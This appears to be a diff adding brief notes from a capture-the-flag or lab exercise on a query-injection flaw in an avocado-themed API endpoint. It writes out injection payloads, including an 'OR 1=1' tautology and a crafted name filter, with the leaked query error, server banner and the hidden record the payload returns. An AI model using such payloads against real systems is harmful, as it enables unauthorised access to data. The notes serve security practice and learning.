@@ -1,0 +1,12 @@
+SQLI in GET /api/avocado
+=> eg make GET /api/avocado/Bacon to get information about Bacon
+=> find out how to abuse the SQLI
+{"error": "Error in Query: FOR avc in avocado_items FILTER avc.name == 'Bacon' OR 1=1;--' RETURN avc"}
+Werkzeug/2.2.3 Python/3.11.2
+
+
+
+{"id": "avocado_items/references", "name": null}
+=> Bacon' OR avc.name == null OR avc.name == 'a
+Result:
+{"_key": "references", "_id": "avocado_items/references", "_rev": "_fyvh63y---", "sources": ["https://californiaavocado.com/avocado101/avocado-varieties/", "http://ucavo.ucr.edu/avocadovarieties/varietyframe.html"]}
